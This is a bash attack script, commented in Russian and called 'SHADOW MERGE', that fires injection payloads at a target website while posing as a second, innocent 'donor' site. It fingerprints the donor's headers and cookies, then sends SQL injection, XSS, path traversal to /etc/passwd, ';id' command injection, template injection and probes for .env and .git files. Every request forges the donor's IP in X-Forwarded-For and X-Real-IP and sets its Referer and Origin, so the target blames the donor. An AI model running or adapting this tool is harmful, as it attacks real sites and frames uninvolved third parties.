#!/bin/bash
# ╔══════════════════════════════════════════════════════════════╗
# ║   🔗 SHADOW MERGE — Слияние двух сайтов в одну атаку       ║
# ║   Цель думает что атака идёт от донора                     ║
# ╚══════════════════════════════════════════════════════════════╝

TARGET=${1:-"http://target.com"}
DONOR=${2:-"http://donor.com"}
MERGE_DIR="$HOME/.shadow_merge"
mkdir -p "$MERGE_DIR"

RED='\033[0;31m'; GR='\033[0;32m'; CY='\033[0;36m'; NC='\033[0m'

echo -e "${RED}╔══════════════════════════════════════════════╗${NC}"
echo -e "${RED}║   🔗 SHADOW MERGE — Слияние атаки           ║${NC}"
echo -e "${RED}╚══════════════════════════════════════════════╝${NC}"
echo ""

# Фаза 1: Снимаем отпечаток донора
echo -e "${CY}[MERGE] 🔍 Снимаю отпечаток донора...${NC}"
DONOR_HEADERS=$(curl -sk --max-time 5 -I "$DONOR" 2>/dev/null)
DONOR_SERVER=$(echo "$DONOR_HEADERS" | grep -i "Server:" | head -1)
DONOR_COOKIES=$(echo "$DONOR_HEADERS" | grep -i "Set-Cookie:" | head -3 | tr '\n' ';')

echo "  🖥️ Сервер донора: $DONOR_SERVER"
echo "  🍪 Куки донора: ${DONOR_COOKIES:0:50}..."
echo ""

# Фаза 2: Слияние — атакуем цель через профиль донора
echo -e "${CY}[MERGE] 🔗 Запускаю слияние...${NC}"
ATTACKS=("' OR '1'='1" "<script>alert(1)</script>" "../../etc/passwd" ";id" "{{7*7}}" "/.env" "/.git/HEAD")

for payload in "${ATTACKS[@]}"; do
    code=$(curl -sk --max-time 5 \
        -H "User-Agent: Mozilla/5.0 (compatible; DonorBot/1.0)" \
        -H "X-Forwarded-For: $(dig +short $(echo $DONOR | sed 's|https\?://||;s|/.*||') 2>/dev/null | head -1 || echo '10.0.0.1')" \
        -H "X-Real-IP: $(dig +short $(echo $DONOR | sed 's|https\?://||;s|/.*||') 2>/dev/null | head -1 || echo '10.0.0.1')" \
        -H "Referer: $DONOR" \
        -H "Origin: $DONOR" \
        "$TARGET?q=$payload" \
        -o "$MERGE_DIR/attack_$(echo $payload | head -c 10 | tr ' ' '_').txt" -w "%{http_code}" 2>/dev/null)

    [ "$code" = "200" ] || [ "$code" = "500" ] && echo "  💀 $payload — HTTP $code" || echo "  ❌ $payload — HTTP $code"
done

echo ""
echo -e "${RED}╔══════════════════════════════════════════════╗${NC}"
echo -e "${RED}║   🔗 SHADOW MERGE — АТАКА ЗАВЕРШЕНА         ║${NC}"
echo -e "${RED}║   Цель видит атаку от донора.               ║${NC}"
echo -e "${RED}╚══════════════════════════════════════════════╝${NC}"
echo "  📁 $MERGE_DIR/"
